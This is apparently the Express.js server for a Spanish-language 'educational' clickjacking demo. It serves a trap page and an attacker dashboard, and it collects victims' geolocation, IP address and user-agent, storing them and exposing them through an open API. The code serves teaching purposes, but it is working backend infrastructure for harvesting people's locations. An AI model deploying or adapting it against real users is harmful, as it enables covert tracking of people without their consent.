const express = require('express');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('public'));

// In-memory storage for captured locations
const capturedLocations = [];

// Serve the trap page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve the attacker dashboard
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Serve the educational reveal page
app.get('/educativo', (req, res) => {
  res.sendFile(__dirname + '/public/educativo.html');
});

// API: Receive captured location
app.post('/api/location', (req, res) => {
  const { latitude, longitude, accuracy, timestamp } = req.body;
  const userAgent = req.headers['user-agent'] || 'Desconocido';
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Desconocido';

  const entry = {
    id: capturedLocations.length + 1,
    latitude,
    longitude,
    accuracy,
    userAgent,
    ip,
    capturedAt: new Date().toISOString()
  };

  capturedLocations.push(entry);
  console.log(`\n🎯 [UBICACIÓN CAPTURADA] #${entry.id}`);
  console.log(`   Lat: ${latitude}, Lng: ${longitude}`);
  console.log(`   Precisión: ${accuracy}m`);
  console.log(`   IP: ${ip}`);
  console.log(`   User-Agent: ${userAgent.substring(0, 60)}...`);

  res.json({ success: true });
});

// API: Get all captured locations
app.get('/api/locations', (req, res) => {
  res.json(capturedLocations);
});

// API: Clear all locations
app.delete('/api/locations', (req, res) => {
  capturedLocations.length = 0;
  res.json({ success: true, message: 'Datos borrados' });
});

app.listen(PORT, () => {
  console.log(`\n╔══════════════════════════════════════════════╗`);
  console.log(`║   CLICKJACKING DEMO - Servidor Educativo     ║`);
  console.log(`╠══════════════════════════════════════════════╣`);
  console.log(`║                                              ║`);
  console.log(`║  🎣 Página trampa:  http://localhost:${PORT}       ║`);
  console.log(`║  📊 Dashboard:      http://localhost:${PORT}/dashboard ║`);
  console.log(`║  📚 Educativo:      http://localhost:${PORT}/educativo ║`);
  console.log(`║                                              ║`);
  console.log(`╚══════════════════════════════════════════════╝\n`);
});
